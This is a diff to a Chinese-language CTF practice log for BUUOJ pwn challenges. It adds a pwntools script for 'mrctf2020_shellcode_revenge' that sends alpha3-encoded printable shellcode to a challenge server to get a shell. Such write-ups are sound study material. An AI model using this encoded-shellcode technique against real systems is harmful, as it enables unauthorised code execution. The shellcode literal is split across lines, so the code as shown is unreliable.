@@ -1,4 +1,4 @@
-# buu刷题记录（41-60题）
+# buu刷题记录（61-80题）
 
 by Maple
 
@@ -204,4 +204,32 @@ p.interactive()
 
 施工中
 
-## 65
+## 65 ciscn_2019_n_3
+
+## 69 mrctf2020_shellcode_revenge
+
+#### 可见字符shellcode
+
+可以学一下alpha3的使用
+
+```python
+from pwn import *
+from LibcSearcher import LibcSearcher
+from ctypes import *
+context(os='linux', arch='amd64',log_level = 'debug')
+context.terminal = 'wt.exe -d . wsl.exe -d Ubuntu'.split()
+host = 'node5.buuoj.cn'
+post = 29364
+p = process('./pwn')
+p = remote(host,post)
+elf = ELF('./pwn')
+#libc = ELF('./pwn')
+#gdb.attach(p)
+
+shellcode = asm(shellcraft.sh())
+shellcode = "Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z
+0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t"
+p.send(shellcode)
+p.interactive()
+```
+
